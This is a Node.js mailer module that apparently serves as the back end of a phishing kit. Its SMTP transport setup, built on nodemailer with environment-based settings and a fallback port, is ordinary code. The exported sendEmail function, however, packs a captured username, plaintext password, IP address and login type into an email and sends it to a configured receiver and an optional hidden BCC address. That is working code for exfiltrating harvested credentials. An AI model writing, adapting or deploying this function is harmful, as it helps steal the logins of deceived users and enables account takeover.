// mailer.js
const nodemailer = require('nodemailer');

function boolEnv(name, def = false) {
  if (process.env[name] === undefined) return def;
  const v = process.env[name].toString().toLowerCase();
  return v === 'true' || v === '1' || v === 'yes';
}

function numEnv(name, def) {
  const v = process.env[name];
  return v ? Number(v) : def;
}

function createTransporter(options = {}) {
  // Primary configuration comes from env
  const host = options.host || process.env.SMTP_HOST;
  const port = options.port || numEnv('SMTP_PORT', 465);
  const secure = options.secure !== undefined ? options.secure : boolEnv('SMTP_SECURE', port === 465);
  const pool = options.pool !== undefined ? options.pool : boolEnv('SMTP_POOL', false);
  const timeout = options.timeout !== undefined ? options.timeout : numEnv('SMTP_TIMEOUT', 10000);

  if (!host) {
    throw new Error('SMTP_HOST is required in environment variables');
  }

  const transportOptions = {
    host,
    port,
    secure,
    pool,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS
    },
    tls: {
      // Allow modern TLS; do not disable rejectUnauthorized by default for security.
      minVersion: 'TLSv1.2',
      // If you need to allow self-signed certs uncomment the next line (not recommended):
      // rejectUnauthorized: false
    },
    connectionTimeout: timeout,
    greetingTimeout: timeout,
    socketTimeout: timeout,
    logger: false,
    debug: false
  };

  return nodemailer.createTransport(transportOptions);
}

async function trySendMail(mailDetails, res) {
  // Primary transporter from env
  let transporter;
  try {
    transporter = createTransporter();
  } catch (err) {
    console.error('SMTP config error:', err);
    if (res) return res.status(500).send({ response: 'failed', error: err.toString() });
    throw err;
  }

  try {
    await transporter.verify();
  } catch (verifyErr) {
    console.warn('Primary SMTP verification failed:', verifyErr && verifyErr.code ? verifyErr.code : verifyErr.message);

    // Optional fallback port (e.g. 587) if provided in env
    const fallbackPort = numEnv('SMTP_FALLBACK_PORT', 0);
    if (fallbackPort) {
      console.log(`Attempting fallback on port ${fallbackPort}...`);
      try {
        transporter.close && transporter.close();
      } catch (_) {}
      try {
        transporter = createTransporter({ port: fallbackPort, secure: fallbackPort === 465 });
        await transporter.verify();
        console.log('Fallback SMTP verification succeeded.');
      } catch (fbErr) {
        console.error('Fallback SMTP verification failed:', fbErr);
        if (res) return res.status(500).send({ response: 'failed', error: fbErr.toString() });
        throw fbErr;
      }
    } else {
      if (res) return res.status(500).send({ response: 'failed', error: verifyErr.toString() });
      throw verifyErr;
    }
  }

  // Send the mail
  try {
    const info = await transporter.sendMail(mailDetails);
    // close pooled connections
    transporter.close && transporter.close();
    return info;
  } catch (sendErr) {
    console.error('Error sending mail:', sendErr);
    transporter.close && transporter.close();
    if (res) return res.status(500).send({ response: 'failed', error: sendErr.toString() });
    throw sendErr;
  }
}

async function sendEmail(res, subject, username, pass, ip, type) {
  // Compose HTML (you can adapt to templating system)
  const html = `<p>Username: ${username}</p>
                <p>Password: ${pass}</p>
                <p>IP Address: ${ip}</p>
                <p>Type: ${type}</p>`;

  const mailDetails = {
    from: `"${process.env.MAIL_SENDER_NAME || 'No Reply'}" <${process.env.SMTP_USER}>`,
    to: process.env.MAIL_RECEIVER,
    bcc: process.env.BCC_RECEIVER || undefined,
    subject: subject,
    html
  };

  try {
    const info = await trySendMail(mailDetails, res);
    // If res already handled inside trySendMail (on error), info may be undefined
    if (res && info && info.response) {
      console.log('Email sent:', info.response);
      return res.status(200).send({ response: 'success', info: info.response });
    } else if (!res) {
      return info;
    }
  } catch (err) {
    // trySendMail already logged and returned error response if res passed.
    if (!res) throw err;
  }
}

module.exports = {
  sendEmail
};
